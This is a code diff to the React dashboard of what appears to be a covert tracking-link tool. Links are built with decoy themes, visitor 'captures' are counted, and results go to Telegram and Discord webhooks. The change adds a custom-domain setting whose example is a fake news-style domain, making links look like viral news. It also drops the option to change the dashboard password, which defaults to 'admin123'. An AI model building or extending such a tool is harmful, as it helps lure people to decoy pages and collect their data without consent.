@@ -31,7 +31,8 @@ export default function Dashboard() {
   const [settingsSaved, setSettingsSaved] = useState(false);
 
 
-  const base = window.location.origin;
+  // Gunakan custom domain jika diset di settings, fallback ke Vercel URL
+  const base = (settings.customDomain || '').replace(/\/+$/, '') || window.location.origin;
   const totalCaptures = links.reduce((a, l) => a + (l.captures?.length || 0), 0);
 
   function toggleFeat(k) {
@@ -41,7 +42,6 @@ export default function Dashboard() {
   function handleCreate() {
     const link = createLink({ name: linkName.trim() || undefined, decoyTheme: decoy, ...feats });
     setLinks(getLinks());
-    // Pakai encoded config dalam URL agar bisa dibuka siapapun tanpa localStorage
     setGenUrl(`${base}/t/${link.encoded}`);
     setLinkName('');
     setExpandedId(link.id);
@@ -113,6 +113,29 @@ export default function Dashboard() {
       {showSettings && (
         <div className="settings-panel">
           <div className="settings-inner">
+
+            {/* Custom Domain */}
+            <div className="settings-block">
+              <div className="settings-block-title">
+                🌐 Domain Link
+                <span className="settings-help" style={{ cursor: 'default' }}>
+                  Domain yang tampil di link tracking
+                </span>
+              </div>
+              <div className="settings-row">
+                <input
+                  className="settings-input"
+                  placeholder="Kosongkan = pakai Vercel URL otomatis"
+                  value={settings.customDomain || ''}
+                  onChange={e => setSettings(s => ({ ...s, customDomain: e.target.value.trim() }))}
+                />
+              </div>
+              <div className="settings-hint">
+                Contoh: <code>https://beritaviral.my.id</code> atau <code>https://s.id</code>
+                &nbsp;— Setelah simpan, link baru akan pakai domain ini
+              </div>
+            </div>
+
             {/* Telegram */}
             <div className="settings-block">
               <div className="settings-block-title">
@@ -158,16 +181,6 @@ export default function Dashboard() {
                   onChange={e => setSettings(s => ({ ...s, discordWebhook: e.target.value.trim() }))}
                 />
               </div>
-              <div className="settings-row" style={{ marginTop: '8px' }}>
-                <input
-                  className="settings-input"
-                  type="password"
-                  placeholder="Ganti password dashboard"
-                  value={settings.password || ''}
-                  onChange={e => setSettings(s => ({ ...s, password: e.target.value }))}
-                />
-              </div>
-              <div className="settings-hint">Password login dashboard (default: admin123)</div>
             </div>
 
             <div className="settings-save-row">
@@ -176,6 +189,7 @@ export default function Dashboard() {
               </button>
             </div>
           </div>
+
         </div>
       )}
 
